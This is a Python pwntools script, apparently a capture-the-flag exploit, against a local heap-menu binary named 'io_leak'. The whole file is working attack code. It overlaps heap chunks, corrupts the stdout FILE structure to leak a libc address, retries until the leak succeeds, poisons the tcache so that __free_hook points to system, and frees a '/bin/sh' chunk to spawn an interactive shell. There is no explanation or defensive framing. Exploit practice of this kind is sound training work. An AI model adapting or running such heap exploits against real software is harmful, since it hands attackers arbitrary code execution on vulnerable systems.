from pwn import *


p = process('./io_leak')

context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def alloca(i,c,data):
    p.recvuntil('>>>')
    p.sendline('1')
    p.recvuntil('idx:')
    p.sendline(str(i))
    p.recvuntil('len:')
    p.sendline(str(c))
    p.recvuntil('content:')
    p.send(data)

def free(i):
    p.recvuntil('>>>')
    p.sendline('2')
    p.recvuntil('idx:')
    p.sendline(str(i))

# 

def leak_addr():
    alloca(0,1,'aa')
    alloca(1,0x4f0,'aaaaaa')
    alloca(2,0xb0,'aa')
    alloca(3,0xb0,'aa')
    free(0)
    alloca(0,0x18,'/bin/sh\x00'*3 + '\xc1')
    free(1)
    alloca(1,0x4f0,'aaaaaa')
    free(2)
    alloca(4,0x30,'\x50\x47')
    alloca(2,0xb0,'aaa')
    alloca(5,0xb0,p64(0)*2 + p64(0xfbad3c80)+p64(0)*3+p8(0))


leak = 0
while True:
    try:
        leak_addr()
        ss = p.recvuntil(chr(0x7f),timeout = 0.5)
        if len(ss) == 0:
            raise Exception('')
        p.recv(16)
        leak = u64(p.recv(8))
        if leak == 0x320a6464412e310a:
            raise Exception('')
        break
    except Exception:
        p.close()
        p = process('./io_leak')
        continue

# launch_gdb()
leak = leak >> 16
log.info('leak libc : '+ hex(leak))
libc_base = leak - 4110208
log.info('libc base: '+ hex(libc_base))
free_hook = 4118760 + libc_base
sys_addr = 324832+libc_base

free(2)
free(4)
alloca(2,0xb0,p64(free_hook))
alloca(4,0x30,p64(free_hook))
alloca(6,0x30,p64(sys_addr))
alloca(7,0x30,p64(sys_addr))
free(0)

p.interactive()
